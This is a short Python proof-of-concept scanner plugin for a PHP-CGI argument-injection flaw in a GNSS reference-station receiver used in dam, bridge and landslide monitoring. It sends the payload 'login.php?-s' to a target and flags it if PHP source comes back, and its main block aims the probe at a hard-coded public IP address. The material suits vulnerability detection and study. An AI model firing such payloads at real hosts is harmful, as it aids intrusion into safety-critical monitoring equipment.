#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time

"""


该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。

POC Name  : 中海达VNet6专业型参考站接收机 PHP-CGI远程执行漏洞
Author    :  a
mail      :  a@lcx.cc

PHP-CGI远程执行漏洞:http://www.venustech.com.cn/NewsInfo/124/13680.Html
"""

def assign(service, arg):
    if service == 'zhonghaida_vnet':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    payload = 'login.php?-s'
    url = arg +  payload
    code, head,res, errcode, _ = curl.curl2(url)
    if '$_SERVER' in res and '$_POST' in res and 'php' in res:
        security_hole(url)
    


if __name__ == '__main__':
    from dummy import *
    audit(assign('zhonghaida_vnet', 'http://222.32.91.55/')[1])